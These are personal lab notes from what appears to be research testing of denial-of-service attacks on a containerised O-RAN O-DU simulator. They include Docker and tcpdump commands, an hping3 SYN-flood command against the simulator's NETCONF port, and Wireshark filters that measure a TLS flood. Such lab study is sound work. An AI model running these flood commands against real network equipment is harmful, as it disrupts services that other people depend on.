
## 0. Check that evey component is ready

docker ps --format "table {{.Names}}\t{{.Status}}"


## 1. Chk the ports of O-DU
docker inspect pynts-o-du-o1 | grep -i -A3 ports
830 port

## 2. Get the address of O-DU

docker inspect pynts-o-du-o1 \
  -f '{{range $k,$v := .NetworkSettings.Networks}}{{$k}} -> {{$v.IPAddress}}{{end}}'

  returns;

  dcn -> 172.21.0.7 smo -> 172.19.0.12

  O-DU is on 2 docker networks; dcn (Data communication network) and SMO, We want DCN one (172.21.0.7)... Why??

## 3. Applied L4 sync attack

  nicolaka/netshoot --> package of all the networking tool (tcpdum[, netcat, wireshark.....])

  But, this build runs NETCONF on 6513, run this;

    ```
    docker run --rm --net=container:pynts-o-du-o1 nicolaka/netshoot ss -tlnp
    ```

  so why previously got 830 in step1 ??? docker inspect shows what is normally declared, not what is real.... so the real address of 0-du is;

  172.21.0.7:6513

  What is L4 sync attack ??

  for wireshark result, chk png 


  Terminal 1: 
  
    docker run --rm \
  --net=container:pynts-o-du-o1 \
  -v "$PWD/captures:/caps" \
  nicolaka/netshoot \
  tcpdump -i any -w /caps/odu_attack.pcap

    Terminal 2:

    docker run --rm --net=dcn nicolaka/netshoot \
  hping3 -S -p 6513 -i u200 172.21.0.7

## 4. TLS flood

    Chk tls_flood.pcap; from t=2470 the attack starts


    tls && ip.src == 172.21.0.9

    the client sends a ClientHello, the server responds with a ServerHello and begins the expensive cryptographic handshake — and then the connection is reset and abandoned. 

    Connection attempts (SYNs) to the server:

    tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 6513
    ≈ 6,500.

    Connections the server actually answered (SYN-ACKs):

    tcp.flags.syn == 1 && tcp.flags.ack == 1 && tcp.srcport == 6513
    ≈ 950.

    The packets dropped shows DOS


Ref ::
F. Feliana, T.-W. Hung, B. Chen, R.-G. Cheng, "Evaluation of Control/User-Plane Denial-of-Service (DoS) Attack on O-RAN Fronthaul Interface," 2024 — arxiv.org/abs/2403.08600. A direct DoS evaluation on an O-RAN interface; closest analogue to what you're doing.

S.-H. Liao, C.-W. Lin, F. A. Bimo, R.-G. Cheng, "Development of C-plane DoS Attacker for O-RAN FHI," MobiCom '22 — doi 10.1145/3495243.3558259. An actual DoS attacker tool built for O-RAN.

## Questions to ask

Any more attack
SIEM Pipeline
Deadline